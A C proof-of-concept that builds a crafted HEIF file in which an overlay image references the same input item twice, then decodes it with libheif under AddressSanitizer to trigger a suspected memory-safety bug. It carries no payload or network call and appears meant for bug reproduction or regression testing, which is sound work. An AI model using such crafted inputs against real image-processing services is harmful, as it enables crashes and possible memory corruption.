/*
 * PoC: HEIF file whose 'iref' box contains a 'dimg' entry that lists the same
 * to_item_ID twice (an 'iovl' overlay placing one input image at two offsets,
 * like HEIF conformance file C021).
 *
 * The file is generated in-memory, written to a temporary path, then read back
 * through the public API (heif_context_read_from_file) and the primary image
 * is decoded.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "libheif/heif.h"

/* ---- minimal big-endian buffer writer ---------------------------------- */

static void put_u8(uint8_t* buf, size_t* n, uint8_t v) { buf[(*n)++] = v; }

static void put_u16(uint8_t* buf, size_t* n, uint16_t v)
{
  buf[(*n)++] = (uint8_t)(v >> 8);
  buf[(*n)++] = (uint8_t)(v & 0xFF);
}

static void put_u32(uint8_t* buf, size_t* n, uint32_t v)
{
  buf[(*n)++] = (uint8_t)(v >> 24);
  buf[(*n)++] = (uint8_t)((v >> 16) & 0xFF);
  buf[(*n)++] = (uint8_t)((v >> 8) & 0xFF);
  buf[(*n)++] = (uint8_t)(v & 0xFF);
}

static void put_fourcc(uint8_t* buf, size_t* n, const char* cc)
{
  memcpy(buf + *n, cc, 4);
  *n += 4;
}

/* begin a box at *n; returns the position of the size field */
static size_t box_begin(uint8_t* buf, size_t* n, const char* type)
{
  size_t size_pos = *n;
  put_u32(buf, n, 0); /* patched by box_end */
  put_fourcc(buf, n, type);
  return size_pos;
}

static void box_end(uint8_t* buf, size_t* n, size_t size_pos)
{
  uint32_t size = (uint32_t)(*n - size_pos);
  buf[size_pos + 0] = (uint8_t)(size >> 24);
  buf[size_pos + 1] = (uint8_t)((size >> 16) & 0xFF);
  buf[size_pos + 2] = (uint8_t)((size >> 8) & 0xFF);
  buf[size_pos + 3] = (uint8_t)(size & 0xFF);
}

/* ---- build the HEIF file ------------------------------------------------ */
/* items:
 *   id 1: 'mski' mask image 8x8 (no codec plugin needed), 64 bytes in idat
 *   id 2: 'iovl' overlay (primary), 'dimg' references [1, 1], canvas 8x8,
 *         offsets (0,0) and (2,2)
 */
static size_t build_file(uint8_t* f)
{
  size_t n = 0;
  size_t s;
  int i;

  /* ftyp */
  s = box_begin(f, &n, "ftyp");
  put_fourcc(f, &n, "heic");
  put_u32(f, &n, 0);
  put_fourcc(f, &n, "mif1");
  put_fourcc(f, &n, "heic");
  box_end(f, &n, s);

  /* meta (full box) */
  s = box_begin(f, &n, "meta");
  put_u32(f, &n, 0); /* version+flags */

  /* hdlr (full box) */
  {
    size_t b = box_begin(f, &n, "hdlr");
    put_u32(f, &n, 0);
    put_u32(f, &n, 0); /* pre_defined */
    put_fourcc(f, &n, "pict");
    put_u32(f, &n, 0);
    put_u32(f, &n, 0);
    put_u32(f, &n, 0);
    put_u8(f, &n, 0);
    box_end(f, &n, b);
  }

  /* pitm (full box): primary item = 2 */
  {
    size_t b = box_begin(f, &n, "pitm");
    put_u32(f, &n, 0);
    put_u16(f, &n, 2);
    box_end(f, &n, b);
  }

  /* iinf (full box) with two infe v2 entries */
  {
    size_t b = box_begin(f, &n, "iinf");
    put_u32(f, &n, 0);
    put_u16(f, &n, 2);
    /* item 1: mski */
    {
      size_t c = box_begin(f, &n, "infe");
      put_u8(f, &n, 2);    /* version 2 */
      put_u8(f, &n, 0);
      put_u8(f, &n, 0);
      put_u8(f, &n, 0);
      put_u16(f, &n, 1);   /* item_ID */
      put_u16(f, &n, 0);   /* protection index */
      put_fourcc(f, &n, "mski");
      put_u8(f, &n, 0);
      box_end(f, &n, c);
    }
    /* item 2: iovl */
    {
      size_t c = box_begin(f, &n, "infe");
      put_u8(f, &n, 2);
      put_u8(f, &n, 0);
      put_u8(f, &n, 0);
      put_u8(f, &n, 0);
      put_u16(f, &n, 2);
      put_u16(f, &n, 0);
      put_fourcc(f, &n, "iovl");
      put_u8(f, &n, 0);
      box_end(f, &n, c);
    }
    box_end(f, &n, b);
  }

  /* iprp */
  {
    size_t b = box_begin(f, &n, "iprp");

    /* ipco: property 1 = ispe 8x8, property 2 = mskC */
    {
      size_t c = box_begin(f, &n, "ipco");
      {
        size_t d = box_begin(f, &n, "ispe");
        put_u32(f, &n, 0);
        put_u32(f, &n, 8);
        put_u32(f, &n, 8);
        box_end(f, &n, d);
      }
      {
        size_t d = box_begin(f, &n, "mskC");
        put_u32(f, &n, 0);
        put_u8(f, &n, 8); /* bits per pixel */
        box_end(f, &n, d);
      }
      box_end(f, &n, c);
    }

    /* ipma (full box) */
    {
      size_t c = box_begin(f, &n, "ipma");
      put_u32(f, &n, 0);
      put_u32(f, &n, 2); /* entry count */
      /* item 1: ispe(essential) + mskC(essential) */
      put_u16(f, &n, 1);
      put_u8(f, &n, 2);
      put_u8(f, &n, 0x80 | 1);
      put_u8(f, &n, 0x80 | 2);
      /* item 2: ispe(essential) */
      put_u16(f, &n, 2);
      put_u8(f, &n, 1);
      put_u8(f, &n, 0x80 | 1);
      box_end(f, &n, c);
    }

    box_end(f, &n, b);
  }

  /* iloc (full box, version 1): both items stored in idat */
  {
    size_t b = box_begin(f, &n, "iloc");
    put_u8(f, &n, 1);    /* version 1 */
    put_u8(f, &n, 0);
    put_u8(f, &n, 0);
    put_u8(f, &n, 0);
    put_u8(f, &n, (4 << 4) | 4); /* offset_size=4, length_size=4 */
    put_u8(f, &n, 0);            /* base_offset_size=0 */
    put_u16(f, &n, 2);           /* item_count */
    /* item 1: offset 0, length 64 */
    put_u16(f, &n, 1);
    put_u16(f, &n, 0x0001);      /* construction_method = idat */
    put_u16(f, &n, 0);
    put_u16(f, &n, 1);
    put_u32(f, &n, 0);
    put_u32(f, &n, 64);
    /* item 2: offset 64, length 22 (overlay spec below) */
    put_u16(f, &n, 2);
    put_u16(f, &n, 0x0001);
    put_u16(f, &n, 0);
    put_u16(f, &n, 1);
    put_u32(f, &n, 64);
    put_u32(f, &n, 22);
    box_end(f, &n, b);
  }

  /* iref (full box): one 'dimg' entry from item 2 listing item 1 twice */
  {
    size_t b = box_begin(f, &n, "iref");
    put_u32(f, &n, 0);
    {
      size_t c = box_begin(f, &n, "dimg");
      put_u16(f, &n, 2); /* from_item_ID */
      put_u16(f, &n, 2); /* reference_count */
      put_u16(f, &n, 1); /* to_item_ID */
      put_u16(f, &n, 1); /* to_item_ID (repeated) */
      box_end(f, &n, c);
    }
    box_end(f, &n, b);
  }

  /* idat: mski pixels (64 bytes) + iovl overlay spec (22 bytes) */
  {
    size_t b = box_begin(f, &n, "idat");
    for (i = 0; i < 64; i++) {
      put_u8(f, &n, 0x7F);
    }
    /* ImageOverlay: version 0, flags 0 (16-bit fields), bg RGBA 0,
       canvas 8x8, offsets (0,0) and (2,2) */
    put_u8(f, &n, 0);
    put_u8(f, &n, 0);
    for (i = 0; i < 4; i++) {
      put_u16(f, &n, 0);
    }
    put_u16(f, &n, 8);
    put_u16(f, &n, 8);
    put_u16(f, &n, 0); /* x0 */
    put_u16(f, &n, 0); /* y0 */
    put_u16(f, &n, 2); /* x1 */
    put_u16(f, &n, 2); /* y1 */
    box_end(f, &n, b);
  }

  box_end(f, &n, s); /* meta */

  return n;
}

int main(int argc, char** argv)
{
  /* Make sure an AddressSanitizer finding aborts (rc 134) even when the
     caller did not set ASAN_OPTIONS=abort_on_error=1. */
  const char* asan_opts = getenv("ASAN_OPTIONS");
  if (!asan_opts || !strstr(asan_opts, "abort_on_error=1")) {
    char buf[1024];
    snprintf(buf, sizeof(buf), "%s%sabort_on_error=1",
             asan_opts ? asan_opts : "", asan_opts ? ":" : "");
    setenv("ASAN_OPTIONS", buf, 1);
    execv(argv[0], argv);
  }

  const char* path = (argc > 1) ? argv[1] : "/tmp/iovl_double_ref.heic";

  static uint8_t filebuf[4096];
  size_t filesize = build_file(filebuf);

  FILE* out = fopen(path, "wb");
  if (!out) {
    perror("fopen");
    return 1;
  }
  fwrite(filebuf, 1, filesize, out);
  fclose(out);

  struct heif_context* ctx = heif_context_alloc();
  struct heif_error err = heif_context_read_from_file(ctx, path, NULL);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "read failed: %s\n", err.message);
    heif_context_free(ctx);
    return 2;
  }

  struct heif_image_handle* handle = NULL;
  err = heif_context_get_primary_image_handle(ctx, &handle);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "no primary image: %s\n", err.message);
    heif_context_free(ctx);
    return 2;
  }

  struct heif_image* img = NULL;
  err = heif_decode_image(handle, &img, heif_colorspace_undefined,
                          heif_chroma_undefined, NULL);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "decode failed: %s\n", err.message);
    heif_image_handle_release(handle);
    heif_context_free(ctx);
    return 3;
  }

  printf("decoded OK: %dx%d\n",
         heif_image_get_width(img, heif_channel_R),
         heif_image_get_height(img, heif_channel_R));

  heif_image_release(img);
  heif_image_handle_release(handle);
  heif_context_free(ctx);
  return 0;
}
